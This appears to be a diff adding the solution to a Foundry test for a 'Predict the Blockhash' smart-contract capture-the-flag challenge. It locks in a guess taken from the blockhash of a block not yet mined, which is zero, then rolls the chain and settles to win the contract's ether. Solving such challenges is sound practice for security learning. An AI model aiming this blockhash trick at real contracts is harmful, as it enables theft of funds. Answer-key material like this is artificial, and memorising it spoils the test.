@@ -24,7 +24,10 @@ contract PredictTheBlockhashTest is Test {
         vm.roll(blockNumber + 10);
 
         // Put your solution here
-
+        bytes32 guess = blockhash(block.number + 1);
+        predictTheBlockhash.lockInGuess{value: 1 ether}(guess);
+        vm.roll(block.number + 2);
+        predictTheBlockhash.settle();
         _checkSolved();
     }
 
